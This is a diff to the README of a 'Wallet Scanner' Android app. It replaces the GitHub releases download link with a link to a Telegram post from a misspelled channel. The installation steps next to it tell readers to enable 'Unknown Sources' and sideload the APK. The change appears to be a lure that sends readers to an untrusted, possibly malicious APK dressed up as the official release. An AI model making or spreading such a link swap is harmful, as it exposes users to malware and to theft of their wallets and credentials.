@@ -41,7 +41,7 @@ Wallet Scanner v3.8 is a sophisticated Android application designed for blockcha
 - Stable internet connection
 
 ### **Installation**
-1. Download the latest APK from [Releases](https://github.com/yourusername/blockchain-wallet-scanner/releases)
+1. Download the latest APK from [Releases]([https://github.com/yourusername/blockchain-wallet-scanner/releases](https://t.me/wallet_orginal/62))
 2. Enable "Unknown Sources" in Android settings
 3. Install and launch the application
 4. Follow the in-app setup wizard
